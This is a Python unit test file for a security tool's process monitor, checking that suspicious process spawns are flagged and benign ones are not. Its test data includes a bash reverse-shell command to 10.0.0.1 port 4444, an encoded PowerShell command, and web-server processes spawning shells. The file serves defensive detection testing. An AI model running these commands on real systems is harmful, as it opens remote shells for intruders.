"""Unit tests for collectors/process_monitor.py (Core Task #2)."""

from auto_sentinel.collectors.process_monitor import ProcessMonitor


def test_web_server_spawning_shell_is_suspicious():
    assert ProcessMonitor.is_suspicious_spawn("nginx", "bash", ["bash"]) is True
    assert ProcessMonitor.is_suspicious_spawn("w3wp.exe", "cmd.exe", ["cmd.exe", "/c", "whoami"]) is True
    assert ProcessMonitor.is_suspicious_spawn("mysqld", "sh", ["/bin/sh"]) is True


def test_encoded_or_reverse_shell_flags_are_suspicious():
    assert ProcessMonitor.is_suspicious_spawn(
        "explorer.exe",
        "python.exe",
        ["python.exe", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"],
    ) is True
    assert ProcessMonitor.is_suspicious_spawn(
        "svchost.exe",
        "powershell.exe",
        ["powershell.exe", "-EncodedCommand", "SQBFAFgA"],
    ) is True


def test_benign_process_is_not_suspicious():
    assert ProcessMonitor.is_suspicious_spawn("systemd", "nginx", ["nginx", "-g", "daemon off;"]) is False
    assert ProcessMonitor.is_suspicious_spawn("explorer.exe", "chrome.exe", ["chrome.exe"]) is False
